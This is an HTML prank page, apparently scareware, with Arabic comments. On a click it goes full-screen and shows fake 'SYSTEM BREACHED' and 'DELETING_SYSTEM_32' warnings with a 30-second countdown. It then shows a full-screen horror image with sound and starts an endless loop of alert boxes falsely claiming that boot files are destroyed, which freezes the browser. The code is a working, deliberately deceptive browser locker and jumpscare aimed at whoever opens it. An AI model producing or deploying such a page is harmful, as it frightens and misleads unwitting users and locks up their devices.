<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FATAL_ERROR_V3</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: monospace; }
        #terminal { position: relative; z-index: 10; height: 100vh; padding: 20px; color: #f00; text-align: center; display: flex; flex-direction: column; justify-content: center; }
        #countdown { font-size: 80px; color: #fff; text-shadow: 0 0 20px #f00; }
        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; display: none; }
    </style>
</head>
<body onclick="startVirus()">

    <div id="terminal">
        <div style="font-size: 20px; animation: blink 0.1s infinite;">⚠️ SYSTEM BREACHED ⚠️</div>
        <div id="countdown">30</div>
        <div style="color: #0ff;">> DELETING_SYSTEM_32...<br>> STATUS: INFECTED_BY_FOUKA</div>
    </div>

    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
    
    <audio id="sfx" src="tfy-krk.mp3" preload="auto"></audio>

    <script>
        let seconds = 30;
        let active = false;

        function startVirus() {
            if (active) return;
            active = true;
            document.documentElement.requestFullscreen().catch(() => {});

            let timer = setInterval(() => {
                seconds--;
                document.getElementById('countdown').innerText = seconds;
                if (seconds <= 0) {
                    clearInterval(timer);
                    triggerScare();
                }
            }, 1000);
        }

        function triggerScare() {
            document.getElementById('terminal').style.display = 'none';
            document.getElementById('horrorImg').style.display = 'block';
            document.getElementById('sfx').play(); // يخدم سواسوة مع الملف المرفوع

            // ميزة اللاق والتبلوكا النهائية
            setTimeout(() => {
                while(true) {
                    alert("⚠️ خطأ قاتل! تم تدمير ملفات الـ Boot.");
                    alert("FATAL_ERROR: PHONE_DYING...");
                }
            }, 100);
        }
    </script>
</body>
</html>
